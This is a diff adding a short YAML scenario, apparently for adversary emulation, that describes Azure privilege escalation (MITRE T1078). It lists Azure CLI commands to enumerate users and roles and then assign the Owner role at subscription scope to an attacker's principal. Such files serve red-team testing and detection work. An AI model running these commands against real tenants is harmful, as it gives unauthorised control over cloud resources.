@@ -1,0 +1,11 @@
+name: Azure Privilege Escalation via Role Assignment
+description: Assigns a high-privilege role to the attacker's principal.
+mitre_technique: T1078
+stage: Privilege Escalation
+steps:
+  - action: az ad user list --query "[].{Name:displayName, ID:objectId}"
+    description: List all users to identify targets
+  - action: az role definition list --query "[].{Name:roleName, ID:name}"
+    description: Enumerate available roles
+  - action: az role assignment create --assignee <attacker-object-id> --role "Owner" --scope /subscriptions/<subscription-id>
+    description: Assign Owner role to attacker
